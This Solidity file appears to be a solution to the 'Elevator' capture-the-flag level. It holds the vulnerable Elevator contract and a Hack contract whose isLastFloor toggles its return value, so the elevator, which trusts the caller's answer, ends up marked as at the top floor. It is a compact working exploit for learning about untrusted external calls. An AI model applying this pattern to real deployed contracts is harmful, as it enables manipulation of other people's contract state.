// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Hack is Building {
    uint public top = 100;
    bool public isTop = true;

    function hack(address target) external {
        Elevator(target).goTo(top);
    }

    function isLastFloor(uint floor) external override returns (bool) {
        if (floor == top) {
            isTop = !isTop;
        }
        return isTop;
    }
}
